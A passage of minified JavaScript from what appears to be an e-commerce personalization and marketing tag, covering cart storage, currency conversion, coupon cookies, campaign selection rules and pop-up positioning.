spApi.e(funcString);}catch(err){spApi._systemRuleError('getCategories',funcString,err);}},setEmailToCookie:function(){try{var funcString=spApi.isMobileBrowser()?"(function(){\nvar data={Login:{},Register:{}};data.Login.email='input[class=\"email\"]';data.Login.button='.login_btn';data.Register.email='#regemail';data.Register.button='.signup_btn';return data;})()":"(function(){\nvar data={Login:{},Register:{}};data.Login.email='#loginAccount';data.Login.button=\"#login_btn\";data.Register.email='#regemail';data.Register.button=\"#signUp\";return data;})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('setEmailToCookie',funcString,err);}},sliderSettings:function(){try{var funcString="(function(){\nreturn{isElementInSlider:function(element){return false;},getImageList:function(){var imageList=[];return imageList;},triggerClick:function(){var clickSelector='#rev_slider_1_1 .slidelink a';spApi.cstmClickHandler(clickSelector);},changeSlider:function(slide,order,logClass){if(logClass!=undefined){}}}})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('sliderSettings',funcString,err);}},getVersusProductDetail:function(){try{var funcString="(function(){})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('getVersusProductDetail',funcString,err);}},getCurrency:function(){try{var funcString="(function(){\nvar k=0;if(typeof dataLayer!=='undefined'&&dataLayer.constructor){for(k;k<dataLayer.length;k++){if(typeof dataLayer[k].Currency!=='undefined'){return dataLayer[k].Currency;}}}})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('getCurrency',funcString,err);}},triggerCartButton:function(){try{var funcString="(function(){})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('triggerCartButton',funcString,err);}},getCartCount:function(){try{var funcString="(function(){\nvar count=0;if(spApi.isOnCartPage()){sQuery(spApi.getPaidProducts()).each(function(index,elem){count+=elem.quantity;});}else{count=JSON.parse(spApi.storageData('ins-cart-product-list')||'{}').totalQuantity||0;}\nreturn count;})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('getCartCount',funcString,err);}},categorySettings:function(){try{var funcString="(function(){\nreturn{getCategoryList:function(){var categoryList=[];return categoryList;},triggerClick:function(){spApi.categoryClickHandler(\"#menu ul.navbar-nav > li > a\");},changeCategory:function(category,fromIndex,toIndex,logClass){if(fromIndex>toIndex){}else{}\nif(logClass!=undefined){}},getElementCategoryText:function(element){return sQuery(element).text();}}})()";return spApi.e(funcString);}catch(err){spApi._systemRuleError('categorySettings',funcString,err);}},setCouponAsistant:function(couponSet,fromPurcha){try{var spNotes=sQuery.cookie('sp-notes');if(spNotes!=null){spNotes=spNotes.split("|");this.displayNotes=spNotes[0];this.notes=spNotes[1];}else if(fromPurcha==false){spNotes=couponSet.split("|");var cupon='2|{"'+spNotes[0]+'":"1423180800#'+spNotes[2]+'#-1"}';sQuery.cookie('sp-notes',cupon,{expires:1423180800,path:'/',domain:cookieDomain});}
if(couponSet!=null){this.showNotes(couponSet,true,fromPurcha);}else if(spApi.getParameter('spNote')||this.displayNotes>0){if(spApi.getParameter('spNote'))setSessionOnlyCookie('couponAsistantShowed','0');this.showNotes(spApi.getParameter("spNote"));}}catch(err){spApi.errLog(err,{logType:'setCouponAsistant',bugType:'product',extraData:{param1:couponSet,param2:fromPurcha}});}},setProductCategory:function(){try{var currentProduct=spApi.getCurrentProduct();var category=sQuery.map(spApi.getProductCategories(),function(val,index){var str=val;return str;}).join("|");var p={cat:category,name:currentProduct.name,id:currentProduct.id};var encoded=spApi.storageData('prodCats');var prodCats=[];if(encoded){prodCats=JSON.parse(encoded);}
for(i in prodCats){if(prodCats[i].name==p.name){prodCats.splice(i,1);}}
prodCats.push(p);spApi.storageData('prodCats',sQuery.toJSON(prodCats),{expires:1,path:'/',domain:cookieDomain});}
catch(err){spApi.errLog(err,{logType:'setProductCategory',bugType:'product'});}},spRefId:"_spRefCode",attr:{spEvent:{left:-736},spHeader:{width:35},spContent:{width:536,height:425},spNotif:{left:0,bottom:0}},urlencode:function(str){str=(str+'').toString();return encodeURIComponent(str).replace(/!/g,'%21').replace(/'/g,'%27').replace(/\(/g,'%28').replace(/\)/g,'%29').replace(/\*/g,'%2A').replace(/%20/g,'+');},getAppliedCode:function(campId){var couponCode='';var cookieData=JSON.parse(sQuery.cookie('sp-noteTimer'));if(cookieData!=null&&cookieData['cId']!=undefined&&cookieData['cId']==campId){if(cookieData['code']!=undefined&&cookieData['couponApply']!=undefined&&cookieData['couponApply']=='applied'){if(cookieData['encoded']!=undefined&&cookieData['encoded']=='true'){couponCode=spApi.Base64.decode(cookieData['code']);}else{couponCode=cookieData['code'];}}}
return couponCode;},updateTotalCartAmount:function(price,increase){var totalAmount=Number(sQuery.cookie('total-cart-amount'))||0;sQuery.cookie('total-cart-amount',increase?(totalAmount+Number(price)):(totalAmount-Number(price)>0?(totalAmount-Number(price)):0),{expires:1,path:'/',domain:partner_site.host});sQuery(document).trigger('cartAmountUpdated');},storeCartProductStorage:function(productList){var cartProductsStorageName='ins-cart-product-list';var twelveHoursAsMilliSeconds=60*60*12*1000;var date=new Date();date.setTime(date.getTime()+twelveHoursAsMilliSeconds);spApi.storageData(cartProductsStorageName,productList,{expires:date,domain:cookieDomain,path:'/'});},getCartProductStorage:function(){return spApi.cachedProductList||((sQuery.parseJSON(spApi.storageData('ins-cart-product-list'))||{}).productList)||[];},storeCartProductInformation:function(productInformation,quantityConfig){if(typeof productInformation==='undefined'&&productInformation.id===undefined){return;}
var cartProductsStorageName='ins-cart-product-list';var currentProductList=JSON.parse(spApi.storageData(cartProductsStorageName)||'{"totalQuantity": 0, "productList": []}');productInformation.quantity=productInformation.quantity||1;function adjustQuantityOfProduct(){var existingProduct=findMatchingProduct();if(Object.keys(existingProduct).length>0){if(typeof quantityConfig.increase!=='undefined'&&quantityConfig.increase){existingProduct.quantity+=Number(quantityConfig.count);productInformation=existingProduct;}else if(existingProduct.quantity>0&&typeof quantityConfig.increase!=='undefined'&&!quantityConfig.increase){existingProduct.quantity-=Number(quantityConfig.count);productInformation=existingProduct;}}}
function findMatchingProduct(){var foundProduct={};currentProductList.productList.map(function(product){if(product.id!==undefined&&product.id===productInformation.id){foundProduct=product;}});return foundProduct;}
function setTotalQuantity(){var totalQuantity=0;currentProductList.productList.forEach(function(product){if(product.id!==undefined){totalQuantity+=product.quantity;}});currentProductList.totalQuantity=totalQuantity;}
adjustQuantityOfProduct();if(Object.keys(findMatchingProduct()).length===0){currentProductList.productList.push(productInformation);}
setTotalQuantity();spApi.storeCartProductStorage(currentProductList);sQuery(document).trigger('changingCartCount');},updateCartCount:function(count){var cartProductsStorageName='ins-cart-product-list';var currentCartProductList=JSON.parse(spApi.storageData(cartProductsStorageName)||'{}');currentCartProductList.totalQuantity=count;currentCartProductList.productList=spApi.getPaidProducts();spApi.storeCartProductStorage(currentCartProductList);sQuery(document).trigger('cartAmountUpdated');},updateCartCookies:function(){var pProd=spApi.getPaidProducts();sQuery.each(pProd,function(key,value){if(pProd.length>4){pProd.pop();}});var date=new Date();date.setTime(date.getTime()+(30*60*1000));spApi.storageData('paid-products',JSON.stringify(pProd),{expires:date,path:'/',domain:cookieDomain});sQuery.cookie('total-cart-amount',spApi.getTotalCartAmount(),{expires:1,path:'/',domain:cookieDomain});sQuery.cookie('current-currency',spApi.getCurrency(),{expires:1,path:'/',domain:cookieDomain});},stringToCurrency:function(currency){try{currency=currency.replace(/^\s+|\s+$/g,'').toUpperCase();var search=['TL','YTL','','EURO','$','DLAR','','','','','','EU','US','Z','',''];var change=['TRY','TRY','EUR','EUR','USD','USD','GBP','RUB','RUB','RUB','TRY','EUR','USD','PLN','JPY','RSD'];sQuery.each(search,function(key,value){currency=(search[key]==currency)?currency.replace(search[key],change[key]):currency;});return currency;}catch(err){spApi.errLog(err);}},setExchangeRate:function(fromCurrency,toCurrency,price){try{if(fromCurrency!=toCurrency&&fromCurrency!=''&&toCurrency!=''){price=(price!=null&&typeof(price)!="number")?price.replace(/[^0-9.,]/g,''):price;if(price!=null&&!isNaN(price)){if(spApi.supportedCurrencies[fromCurrency]!=undefined){if(spApi.supportedCurrencies[fromCurrency][toCurrency]!=undefined)
return(Math.round(spApi.supportedCurrencies[fromCurrency][toCurrency]*price*1000)/1000);}
if(spApi.supportedCurrencies[toCurrency]!=undefined){if(spApi.supportedCurrencies[toCurrency][fromCurrency]!=undefined)
return(Math.round((1/spApi.supportedCurrencies[toCurrency][fromCurrency])*price*1000)/1000);}}}
return price;}catch(err){spApi.errLog(err);}},getExchangeRate:function(fromCurrency,toCurrency,data,element){try{switch(typeof data){case"number":var convertedPrice=spApi.setExchangeRate(fromCurrency,toCurrency,data);break;case"string":var convertedPrice=(isNaN(data))?data:spApi.setExchangeRate(fromCurrency,toCurrency,parseFloat(data));break;case"object":if(data!=null){if(data.length==undefined){if(data.hasOwnProperty(element))
data[element]=spApi.setExchangeRate(fromCurrency,toCurrency,data[element]);}else{for(var i=0;i<data.length;i++){if(data[i].hasOwnProperty(element))
data[i][element]=spApi.setExchangeRate(fromCurrency,toCurrency,data[i][element]);}}}
var convertedPrice=data;break;default:var convertedPrice=data;}
return convertedPrice;}catch(err){spApi.errLog(err);}},writeConsoleLog:function(){try{if(typeof spApi.consoleLog==='object'){sQuery(spApi.consoleLog).each(function(id,text){spApi.logger('info',text);});}}catch(err){spApi.errLog(err,{logType:'writeConsoleLog',bugType:'product'});}},getCampSalesSesInfo:function(campId,objType,productType){try{campId=((productType=='20')&&(campId.toString().indexOf('c')==-1))?'c'+campId:campId;var cmp=spApi.storageData('sp-camp-'+campId);if(cmp==null||cmp==undefined){return'0';}else{var obj=JSON.parse(cmp);return(obj[objType]==undefined)?'0':obj[objType];}}catch(err){spApi.errLog(err);}},getBuilderIdFromVar:function(campId)
{var segments=JSON.parse(spApi.storageData('user-segments'));for(var i in segments){if(segments[i]==campId)return i;}
return false;},e:function(js)
{return eval(js);},concat:function(camps,objects)
{sQuery.each(objects,function(i,obj){camps.push(obj);});return camps;},getCampOfThePage:function(campaignList)
{try{var mobileCamps=[];var webCamps=[];var tabletCamps=[];function collectCampaignsOnList(platformSpecificCampaignList,campaign){platformSpecificCampaignList.forEach(function(list){list.push(campaign);});};sQuery.each(campaignList,function(index,campaign){if(spApi.isMobileCamp(campaign)){collectCampaignsOnList([mobileCamps],campaign);}else if(spApi.isTabletCamp(campaign)){collectCampaignsOnList([tabletCamps],campaign);}else if(spApi.isAllPagesCamp(campaign)){collectCampaignsOnList([webCamps,tabletCamps,mobileCamps],campaign);}else{collectCampaignsOnList([webCamps],campaign);}});if(spApi.deviceDetect('PC')){campaignList=webCamps;}else if(spApi.deviceDetect('Mobil')){campaignList=mobileCamps;}else if(spApi.deviceDetect('Tablet')){campaignList=tabletCamps;}
if(spApi.isMobileBrowser()){var isControlGroupAdaptive;var recentProductId='31';var infoProductType='24';function isCustomCampaign(campaign){return campaign.id.indexOf('c')>-1;}
function campaignIsMultiDevice(campaign){return campaign.productType==recentProductId||isCustomCampaign(campaign)||(campaign.productType==infoProductType&&(spApi.notifies[campaign.id].mode=='adaptive'||isControlGroupAdaptive))}
function campaignIsSegmentedAsMultiDevice(segmentString){return(segmentString.indexOf('Mobil')>-1||segmentString.indexOf('Tablet')>-1||segmentString.indexOf('spApi.deviceDetect("All")')>-1);}
sQuery.each(webCamps,function(index,webCamp){if(webCamp.platform=="tablet"||webCamp.platform=="mobile"){return;}
isControlGroupAdaptive=false;if(webCamp.productType=='24'&&spApi.isControlCamp(webCamp.id)){var personalizationId=spApi.getPersonalizationId(webCamp.id);var personalizationVariations=spApi.personalizationCamps[personalizationId].variations;sQuery.each(personalizationVariations,function(index,variation){if(variation.varId!=webCamp.id){var tmpCamp=spApi.getCamp(variation.varId).camp;if(tmpCamp.productType=='24'&&spApi.notifies[tmpCamp.id].mode=='adaptive'){isControlGroupAdaptive=true;}}});}
if(campaignIsMultiDevice(webCamp)){var segment=webCamp.showIn.segment||[];sQuery.each(segment,function(index,segmentId){if(segmentId!==null){var segmentString=spApi.rules[segmentId].test;if(campaignIsSegmentedAsMultiDevice(segmentString)&&spApi.e(spApi.rules[segmentId].test)){campaignList.push(webCamp);}}});}});}else{campaignList=webCamps;}
spApi.getPersonalizationCamp();var now=Math.round(new Date()/1000);activeCamp=false;spApi.activeCamps=[];sQuery.each(campaignList,function(index,camp){if(!spApi.isBrowserSupportEnabled(camp.id)){return true;}
if(!spApi.checkVarSegment(camp)){return true;}
if(!spApi.isCookieSupportEnabled()){return true;}
camp.trigTimeCount=(typeof camp.trigTimeCount=="undefined")?0:camp.trigTimeCount;var dateChecked=(camp.activeDateStart<now&&now<camp.activeDateEnd)?true:false;var showThis=true;var hideThis=false;var isFreqRuleOk=false;var isFreqRuleExist=false;if(camp.hideIn!=undefined&&camp.hideIn.length>0){sQuery.each(camp.hideIn,function(index,value){id=value;rule=spApi.rules[id];if(spApi.ruleControl(rule,camp)){hideThis=true;showThis=false;}
if(!spApi.checkCampaignLanguage(camp)){hideThis=true;showThis=false;}
if(camp.showIn.length<=0&&hideThis!=true){showThis=true;}});}
if(!hideThis&&camp.showIn)
{if(camp.showIn.segment!=undefined&&camp.showIn.segment[0]!=null){sQuery.each(camp.showIn.segment,function(i,id){rule=spApi.rules[id];if(!spApi.ruleControl(rule,camp)){showThis=false;return false;}else{showThis=true;}
if(!spApi.checkCampaignLanguage(camp)){showThis=false;}});}
if(camp.showIn.trigger!=undefined&&camp.showIn.trigger[0]!=null&&camp.trigTimeCount==0){var triggerStatus=false;sQuery.each(camp.showIn.trigger,function(i,id){rule=spApi.rules[id];if(!spApi.ruleControl(rule,camp)){triggerStatus=triggerStatus||false;}else{triggerStatus=triggerStatus||true;}});showThis=showThis&&triggerStatus;if(!spApi.checkCampaignLanguage(camp)){showThis=false;}}
if(typeof camp.showIn[0]!="undefined"){sQuery.each(camp.showIn,function(i,id){rule=spApi.rules[id];if(!spApi.ruleControl(rule,camp)){showThis=false;return false;}else{showThis=true;}
if(!spApi.checkCampaignLanguage(camp)){showThis=false;}});}
if(isFreqRuleExist)
showThis=showThis&&isFreqRuleOk;}
if(camp&&camp.trigTimeCount>0)
{sQuery.each(camp.showIn.trigger,function(i,id){rule=spApi.rules[id];if(rule.test.indexOf("isRefContains")>-1){var param=rule.test.split("'");if(document.referrer.indexOf(param[1])){if(!sQuery.cookie("spref")){var date=new Date();date.setTime(date.getTime()+(5*60*60*1000));sQuery.cookie('spref',document.referrer,{expires:date,path:'/'});}
if(sQuery.cookie("spref").indexOf(param[1])){if(spApi.ruleControl(rule,camp)){var pref=sQuery.cookie('pref');if(!pref)
pref=0;pref=parseInt(pref)+1;sQuery.cookie("pref",pref,{expires:1,path:'/'});}}}
var pref=sQuery.cookie('pref');if(pref>camp.trigTimeCount){showThis=true;}else{showThis=false;}}else if(rule.test.indexOf("hasParameter")>-1||rule.test.indexOf("getParameter")>-1){if(spApi.ruleControl(rule,camp)){var pprm=sQuery.cookie('pprm');if(!pprm)
pprm=0;pprm=parseInt(pprm)+1;sQuery.cookie("pprm",pprm,{expires:1,path:'/'});if(pprm>camp.trigTimeCount&&spApi.e(rule.test)){showThis=true;}else{showThis=false}}else{showThis=false;}}else{if(spApi.ruleControl(rule,camp)){var prl=sQuery.cookie('prl');if(!prl)
prl=0;prl=parseInt(prl)+1;sQuery.cookie("prl",prl,{expires:1,path:'/'});if(prl>camp.trigTimeCount&&spApi.e(rule.test)){showThis=true;}else{showThis=false}}else{showThis=false;}}});}
if(camp.locationisActive==1&&spApi.isMobileBrowser()){hideThis=true;showThis=false;}else{if(camp.productType!=20&&sQuery.cookie('sp-noteTimer')!=null){showThis=false;}
var triggerIsActive='0';var showIfJoined='0';var infoSettings=spApi.notifies[camp.id];if(camp.productType==24){triggerIsActive=infoSettings.triggerIsActive;var campCookie=JSON.parse(spApi.storageData('sp-camp-'+camp.id))||{};if(typeof campCookie['closed']!=="undefined"&&triggerIsActive=='1'){showThis=false;}
var feedSettings=infoSettings.predictiveFeedSettings;if(feedSettings!==null&&typeof feedSettings==='object'&&Object.keys(feedSettings).length>0){showIfJoined='1';}
var campShowingStatus=infoSettings.locationConfig.showAlways;if(campShowingStatus!=='undefined'&&campShowingStatus==='true'){showIfJoined='1';}}
if(!spApi.checkDailyDisplay(camp)){showThis=false;}
if(showThis)
{if(spApi.checkConditionNeed(camp)&&spApi.storageData('sp-camp-'+camp.id)){return true;}
if(camp.productType==24){var locationConfig=spApi.notifies[camp.id].locationConfig;var selectedElement=locationConfig.selectedElement;}
var isRelativeIsNotPlaceable=function(){var relativeStatus=false;var isTypeRelativeInFrame=locationConfig.type==1;var isTypeRelativeInFrameless=locationConfig.frameless=='true'&&locationConfig.relativePositioning=='true';if(isTypeRelativeInFrame){relativeStatus=!sQuery(selectedElement).exists();}else if(isTypeRelativeInFrameless){if(typeof locationConfig.relativePosition.element!=='undefined'){selectedElement=locationConfig.relativePosition.element;}
relativeStatus=!sQuery(selectedElement).exists();}
return relativeStatus;};var isInlineIsNotPlaceable=function(){var isTypeInline=locationConfig.type=='2';return isTypeInline&&!sQuery(selectedElement).exists();};if(camp.productType==24&&(isRelativeIsNotPlaceable()||isInlineIsNotPlaceable())){spApi.logger('warning','Konumlandrlan element olmad iin gsterilmedi. Element : '+selectedElement,camp.id);return true;}
if((spApi.spCampCheckStatus(camp.id,'liked')||spApi.spCampCheckStatus(camp.id,'joined'))&&camp.productType!=20&&triggerIsActive!='1'&&showIfJoined!='1'){return true;}
if(camp.productType==24&&locationConfig.type=="2"){spApi.logger('info','Aktif inline kampanya : '+camp.id);spApi.showCamp(camp,0,true);return true;}
if(camp.productType==28){spApi.showCamp(camp,0,true);return true;}
if(camp.productType==31){spApi.showSmartFeed(camp);return true;}
if(dateChecked){spApi.activeCamps.push(camp);}
if(!activeCamp&&dateChecked){activeCamp=camp;}else{if(parseInt(activeCamp.priority)>parseInt(camp.priority)&&dateChecked){activeCamp=camp;}}}}});if(!activeCamp)return false;spApi.activeCamp=activeCamp;spApi.logger('info','Aktif kampanya : '+spApi.activeCamp.id);return spApi.activeCamp;}catch(err){spApi.errLog(err,{logType:'getCampOfThePage',bugType:'product',extraData:{param1:campaignList}});}},setNotificationHeightFromContent:function(pmTarget,callback){sQuery(pmTarget).pm(function(data){var frameConfig={height:sQuery('#insider-notification-content').outerHeight()};return frameConfig;},function(config){return callback(config);});},setInlineNotificationHeightFromContent:function(pmTarget,callback){sQuery(pmTarget).pm(function(data){var frameConfig={height:sQuery('#insider-notification-content').outerHeight()};return frameConfig;},function(config){return callback(config);});},setSocialProofNotificationContent:function(pmTarget,campId,callback){spApi.notifies[campId]['kkbSettings']={'@instantView':1,'@dailyView':1,'@dailyPurchase':1,'@instantPurchase':1,'@inBasketCount':1};esCountAnalytics(function(countAnalytics){esLiveFeed(function(liveFeed){sQuery(pmTarget).pm(function(data){var kkbData={'@instantView':data.countStat.instantView,'@dailyView':data.countStat.dailyView,'@dailyPurchase':data.liveFeed.purchase.dailyPurchase,'@instantPurchase':data.liveFeed.purchase.instantPurchase,'@inBasketCount':data.liveFeed.inBasketCount};var display=true;var textArea=sQuery('.social-proof-text-area .element-editable,.inline-social-proof-text-area .element-editable');var minimum=data.socialProofSettings.min;var random=data.socialProofSettings.random;sQuery.each(data.kkbSettings,function(key,value){if(textArea.html().indexOf(key)>=0){if(kkbData[key]>0&&minimum[key]<=kkbData[key]){textArea.html(textArea.html().replace(key,kkbData[key]));}else{display=false;}}});var frameConfig={height:sQuery('.swiper-slide-active').height(),display:display};return frameConfig;},function(config){return callback(config);},{countStat:countAnalytics,liveFeed:liveFeed,kkbSettings:spApi.notifies[campId]['kkbSettings'],socialProofSettings:spApi.notifies[campId]['socialProofSettings']});});},campId);},getPositionOfTheCamp:function(locationConfig,cssConfig){try{version=(typeof version==="undefined")?1:version;var positionSettings=new Array();var saveWidth=locationConfig.spWindowWidth;var saveHeight=locationConfig.spWindowHeight;var realWidth=sQuery(window).width();var realHeight=sQuery(window).height();var spWidthDifferance=(realWidth-saveWidth)/2;var spHeightDifferance=(realHeight-saveHeight)/2;if(typeof saveWidth==='undefined'){spWidthDifferance=0;}
var borderWidth=cssConfig.borderWidth;if(typeof borderWidth==='undefined'||borderWidth==''){borderWidth=0;}else{borderWidth=cssConfig.borderWidth.replace('px','')*2;}
var spFixed='fixed';var positionLeft=locationConfig.positionLeft+spWidthDifferance;var spWidthDifferanceControl=(locationConfig.positionLeft+Number(cssConfig.width)+borderWidth)>=saveWidth;if(positionLeft<0||locationConfig.positionLeft<=0){positionLeft=0;}else if((positionLeft+Number(cssConfig.width)+borderWidth)>realWidth||spWidthDifferanceControl){positionLeft=realWidth-(Number(cssConfig.width)+borderWidth);}
var positionTop=locationConfig.positionTop;if(positionTop<0||locationConfig.positionTop<=0){positionTop=0;}
if(spFixed=='fixed'&&((positionTop+Number(cssConfig.height)+borderWidth)>realHeight||(positionTop+Number(cssConfig.height)+borderWidth+1)>=saveHeight)){positionTop=realHeight-(Number(cssConfig.height)+borderWidth);}
if((locationConfig.positionType==1||locationConfig.positionType==3)&&sQuery(locationConfig.selectedElement).length>0){positionLeft=sQuery(locationConfig.selectedElement).offset().left+locationConfig.positionLeft;positionTop=sQuery(locationConfig.selectedElement).offset().top+locationConfig.positionTop;}
positionSettings.positionLeft=positionLeft;positionSettings.positionTop=positionTop;positionSettings.spFixed=spFixed;positionSettings.saveWidth=saveWidth;positionSettings.saveHeight=saveHeight;positionSettings.realWidth=realWidth;positionSettings.realHeight=realHeight;return positionSettings;}catch(err){spApi.errLog(err,{logType:'getPositionOfTheCamp',bugType:'product',extraData:{param1:locationConfig,param2:cssConfig}});}},showTrigger:function(campId,settings){sQuery('#insTriggerContent').show();if(settings.effect!='none'){sQuery('#insTriggerContent').effect(settings.effect);}
var logData={key:'sp-camp-'+campId,obj:{'step1-displayed':true},campId:campId};spApi.updateCookie(logData);},getTriggerPosition:function(data,fixed){var pos=data;var savedPos={left:parseFloat(pos.left),top:parseFloat(pos.top)};var currentWindow={width:parseFloat(sQuery(window).width()),height:parseFloat(sQuery(window).height())};var savedWindow={width:parseFloat(pos.windowWidth),height:parseFloat(pos.windowHeight)};pos.contentHeight=parseFloat(pos.contentHeight);pos.contentWidth=parseFloat(pos.contentHeight);pos.left=parseFloat(pos.left);pos.top=parseFloat(pos.top);var diff=(currentWindow.width-savedWindow.width)/2;pos.left=savedPos.left+diff;pos.top=savedPos.top;if(pos.left<0||savedPos.left<=0){pos.left=0;}
if(pos.top<0||savedPos.top<=0){pos.top=0;}
var leftDiff=pos.left+pos.contentWidth;if(leftDiff>currentWindow.width||leftDiff>=savedWindow.width){pos.left=currentWindow.width-pos.contentWidth;}
var topDiff=pos.top+pos.contentHeight;if(fixed=='1'&&(topDiff>currentWindow.height||(topDiff+1)>=savedWindow.height)){pos.top=currentWindow.height-pos.contentHeight;}
if(pos.windowWidth===null||pos.windowHeight===null){pos.left=30;pos.top=30;}
return pos;},setTrigger:function(settings,callback){if(sQuery('#insTriggerContent').exists()){return false;}
var position=spApi.getTriggerPosition(settings.position,settings.fixed);var positionCss={};if(settings.positionDirection=='left'){positionCss.left='0px';positionCss.top=position.top;}
else if(settings.positionDirection=='right'){positionCss.right='0px';positionCss.top=position.top;}
else if(settings.positionDirection=='top'){positionCss.left=position.left;positionCss.top='0px';}
else if(settings.positionDirection=='bottom'){positionCss.left=position.left;positionCss.bottom='0px';}
var triggerCss={display:'none',width:'35px',height:'175px','box-shadow':'1px 1px 6px rgba(34,25,25,.4)','background-color':'#636363',color:'#ffffff','z-index':'2147483647',position:settings.fixed=='1'?'fixed':'absolute','cursor':'pointer'};sQuery.extend(triggerCss,positionCss);sQuery('<div />',{id:'insTriggerContent',css:triggerCss}).appendTo('body');sQuery('<p />',{id:'insTriggerNav',html:'',css:{'transform':'rotate(-90deg)','text-align':'center','height':'99%','line-height':'22px','font-weight':'700','float':'none','letter-spacing':'-.5px','font-size':'20px','font-family':'sans-serif','width':'180px'}}).appendTo('#insTriggerContent');if(settings.image!=='none'){sQuery('<img />',{id:'insTriggerImage',src:settings.image,css:{display:'block','filter':'drop-shadow(1px 1px 6px #222)','-webkit-filter':'drop-shadow(1px 1px 6px #222)'}}).appendTo('#insTriggerContent');sQuery('#insTriggerContent').css({'width':'auto','height':'auto','background-color':'transparent','box-shadow':'none'}).find('#insTriggerNav').hide();}
sQuery('#insTriggerContent').die('click').live('click',function(){sQuery(this).hide();var cookieData={key:'sp-camp-'+spApi.activeCamp.id,obj:{'triggerHide':'1'},campId:spApi.activeCamp.id};spApi.updateCookie(cookieData);callback();});},showSmartFeed:function(camp){var sInterval=setInterval(function(){if(typeof spApi.widgets.smartFeed!=='undefined'&&spApi.widgets.smartFeed.inited){clearInterval(sInterval);spApi.widgets.smartFeed.show(camp);}},100);setTimeout(function(){clearInterval(sInterval);},3000);},showCamp:function(camp,viewType,independent)
{try{if(camp.productType==30){spApi.activeWebPushes.push(camp);spApi.setTriggerPushes(spApi.pmData);return false;}
if(!spApi.isBrowserSupportEnabled(camp.id)){return false;}
if(!spApi.isCookieSupportEnabled()){return false;}
var getCouponCode=function(inlineMode){var notifyType=inlineMode===true?'inline':'';var couponCodeKeyPrefix='sp-info-c-';pm({type:'getOtherCookies',data:{key:couponCodeKeyPrefix+camp.id},target:sQuery('#spWorker')[0].contentWindow,success:function(couponCode){if(couponCode==null){var couponCodeUrl=spApi.apiUrl+'ajax.php?'+couponSection;sQuery.ajax({type:"POST",url:couponCodeUrl,data:{referer:top.location.href,campId:camp.id,campType:'bounce',notifyType:notifyType},cache:false,contentType:'application/json',dataType:'jsonp',crossDomain:true});}else{sQuery('.insdrNotifyCoupon').find('.editable').text(couponCode);}}});};if(typeof independent==='undefined')independent=false;if(sQuery('#spFrame').length>0&&!independent)
return false;if(independent&&sQuery('.sp-inner-'+camp.id).length>0)return false;var me=this;if(!viewType)
viewType=0;if(!camp||disable_camp)
return;var jsStyle='';var triggerIsActive=0;var trigPosition=0;var triggerSettings={};if(camp.trigTimeOut>0||viewType==1)
jsStyle=' style = "display:none"';if(camp.productType==24){triggerIsActive=spApi.notifies[camp.id].triggerIsActive;triggerSettings=spApi.notifies[camp.id].triggerSettings;}
var excludedProductTypes=[20,21,24,28,31];if(!independent&&excludedProductTypes.indexOf(Number(camp.productType))==-1){var html;if(triggerIsActive){var trigPositionCss="";var headerNavPosition="";var spHeaderCss="";var spHeaderNavCss="";var spHeaderpCss="";if(trigPosition==1){trigPositionCss="left:0px;width:35px;top:"+spApi.notifies[camp.id].locationConfig.positionTop+"px!important";headerNavPosition="187";}
else if(trigPosition==2){trigPositionCss="right:0px!important;left:auto;width:35px;top:"+spApi.notifies[camp.id].locationConfig.positionTop+"px!important";headerNavPosition="171";}
else if(trigPosition==3){trigPositionCss="top:0px!important;height:auto;left:"+spApi.notifies[camp.id].locationConfig.positionLeft+"px!important;width: 169px;";headerNavPosition="171";spHeaderCss="width: 165px;height: 31px;";spHeaderNavCss="float: left;width: 30px;line-height: 1.0em!important;-webkit-transform: rotate(-90deg);-moz-transform: rotate(-90deg);-o-transform: rotate(-90deg);-ms-transform: rotate(-90deg);transform: rotate(-90deg);";spHeaderpCss="margin-top: 5px;width: 163px;-webkit-transform:rotate(0deg);-moz-transform: rotate(0deg);-o-transform: rotate(0deg);-ms-transform: rotate(0deg);transform: rotate(0deg);";}
else if(trigPosition==4){trigPositionCss="top:inherit!important;bottom:0px!important;left:auto;height:auto;left:"+spApi.notifies[camp.id].locationConfig.positionLeft+"px!important;width: 169px;";headerNavPosition="171";spHeaderCss="width: 165px;height: 31px;";spHeaderNavCss="float: left;width: 30px;line-height: 1.0em!important;-webkit-transform: rotate(90deg);-moz-transform: rotate(90deg);-o-transform: rotate(90deg);-ms-transform: rotate(90deg);transform: rotate(90deg);";spHeaderpCss="margin-top: 5px;width: 163px;-webkit-transform:rotate(0deg);-moz-transform: rotate(0deg);-o-transform: rotate(0deg);-ms-transform: rotate(0deg);transform: rotate(0deg);";}
html='<div style="'+trigPositionCss+'" id="spEvent"'+jsStyle+'>';html+='<div id="spHeader" style="margin-top: 0px!important;'+spHeaderCss+'">';html+='<div class="spHeaderNav" style="'+spHeaderNavCss+'">&#171</div><p style="'+spHeaderpCss+'"><span></span></p>';html+='</div>';html+='</div>';}else{html='<div id="spEvent"'+jsStyle+'>';html+='<div id="spContent">';html+='<iframe id="spFrame"></iframe>';html+='</div>';html+='<div id="spHeader">';html+='<div class="spHeaderNav">&#171</div><p><span></span></p>';html+='</div>';html+='</div>';}
var a=sQuery(html);if(camp.advancedCss.length>0){var campCss=JSON.parse(camp.advancedCss);if(campCss){this.css=campCss.freeStyle;if(typeof this.css!=="undefined"){sQuery('body').append('<style>'+this.css+'</style>');}
this.triggerBg=campCss.triggerTextBg;this.triggerColor=campCss.triggerTextColor;if(triggerIsActive){var triggerColors=JSON.parse(camp.advancedCss);sQuery('body').append('<style id="insTriggerDefaultCss">'+'#spHeader {background-color:#'+triggerColors.triggerTextBg+' !important;margin-top:35px;height:175px;border-radius:0px}'+'#spHeader p {margin-top:0px;width: 149px;}'+'#spHeader p span{color:#'+triggerColors.triggerTextColor+' !important;}'+'.spHeaderNav {color:#'+triggerColors.triggerTextColor+' !important;}'+'</style>');}else{sQuery('body').append('<style id="insTriggerDefaultCss">'+'#spHeader {background-color:#'+this.triggerBg+' !important;}'+'#spHeader p span{color:#'+this.triggerColor+' !important;}'+'.spHeaderNav {color:#'+this.triggerColor+' !important;}'+'</style>');}}}
if(camp.triggerText)
sQuery("#spHeader span",a).text(camp.triggerText);else
sQuery("#spHeader span",a).text(me.triggerText);tmpPageUrl="&pageUrl="+this.urlencode(window.location.href);var app="";if(!sQuery('#spEvent')[0]&&!spApi.checkConditionNeed(camp)){sQuery('body').append(a);}
if(viewType==0&&camp.productType!=17)
